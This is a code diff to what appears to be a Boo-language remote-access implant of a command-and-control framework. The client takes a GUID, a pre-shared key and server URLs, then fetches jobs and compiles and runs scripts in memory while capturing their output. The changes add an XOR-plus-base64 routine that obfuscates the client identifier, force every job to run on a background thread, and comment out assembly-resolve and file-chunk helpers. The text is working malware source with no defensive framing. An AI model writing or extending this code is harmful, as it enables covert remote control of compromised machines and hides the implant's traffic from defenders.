@@ -19,7 +19,18 @@ import Boo.Lang.Compiler.Pipelines
 import Microsoft.VisualBasic.Devices
 import Microsoft.Win32
 
-ASSEMBLY_RESOLVE_EVENT_HANDLER_GOES_HERE
+/*
+public static def MyResolveEventHandler(sender as object, args as ResolveEventArgs) as Assembly:
+    print("Trying to resolve $(args.Name).dll")
+    result = [asm for asm in AppDomain.CurrentDomain.GetAssemblies()].Find() do (item as Assembly):
+        return @/,/.Split(item.ToString())[0] == args.Name
+
+    if result:
+        print("Found assembly $(result)")
+        return result
+
+    return result
+*/
 
 public def urljoin(*args) as string:
     t = map(args) def (arg as object):
@@ -41,6 +52,36 @@ public def Hex2Binary(hex as string) as (byte):
 
     return bytes.ToArray()
 
+public def encryptXOR(id as string) as string:
+    random = gen_random_string()
+    def xor_two_str(a,b):
+        byteA=ASCIIEncoding().GetBytes(a)
+        byteB = ASCIIEncoding().GetBytes(b)
+        result = array(byte,[0]*len(byteA))
+        for i in range(len(byteA)):
+           result[i]=byteA[i]^byteB[i%len(byteB)]
+        return ASCIIEncoding().GetString(result)
+    dateTime = DateTime.UtcNow
+    epoch = DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc)
+    unixDateTime = Convert.ToInt32((dateTime.ToUniversalTime() - epoch).TotalSeconds)
+    return  Base64UrlEncode(xor_two_str(unixDateTime+id,random)+random)
+
+
+public def Base64UrlEncode(url as string) as string:
+    bytes = Encoding.UTF8.GetBytes(url)
+    s = Convert.ToBase64String(bytes); // Regular base64 encoder
+    s = s.Replace('+', '-') // 62nd char of encoding
+    s = s.Replace('/', '_') // 63rd char of encoding
+    return s
+
+/*
+public static def GetFileChunk(bytes_read as (byte)) as (byte):
+    #using dest_stream = File.Create("$(f_number).chunk"):
+    using dest_stream = MemoryStream():
+        dest_stream.Write(bytes_read, 0, bytes_read.Length)
+        return dest_stream.ToArray()
+*/
+
 class CryptoException(Exception):
     def constructor(message):
         super(message)
@@ -57,7 +98,6 @@ class Args:
     public args as List
     public source as string
     public references as List
-    public run_in_thread as bool = true
 
 class JsonJob:
     public id as string
@@ -224,15 +264,12 @@ class STJob:
         Client = client
         Job = job
 
-        id = Job.id
+        id = job.id
         cmd = Job.cmd
         if Client.Debug:
             print id, cmd
 
-        if Job.args.run_in_thread:
-            Start.BeginInvoke(null, null)
-        else:
-            Start()
+        Start.BeginInvoke(null, null)
 
     /*
         type = self.GetType()
@@ -385,6 +422,7 @@ class STJob:
                 using scriptOutput = StringWriter():
                     Console.SetOut(scriptOutput)
                     Console.SetError(scriptOutput)
+
                     #Call the Main function in the compiled assembly if available else call Start
                     try:
                         module.Main()
@@ -401,10 +439,6 @@ class STJob:
                 standardError = StreamWriter(Console.OpenStandardError())
                 standardError.AutoFlush = true
                 Console.SetError(standardError)
-
-    public def SendJobResults(output as string):
-        result = output
-        Client.SendJobResults(self)
 
 class STClient:
     public Jobs as List = []
@@ -528,7 +562,8 @@ class STClient:
             #Thread.Sleep(GetSleepAndJitter())
 
 public static def Main(argv as (string)):
-    ASSEMBLY_RESOLVE_HOOK_GOES_HERE
+     #AppDomain.CurrentDomain.AssemblyResolve += ResolveEventHandler(MyResolveEventHandler)
+
     client = STClient(Guid: Guid(argv[0]), PSK: argv[1], Urls: @/,/.Split(argv[2]))
     #client.Jobs.Add(STJob(JsonJob(id: "test", cmd: "Upload"), client))
     client.Start()
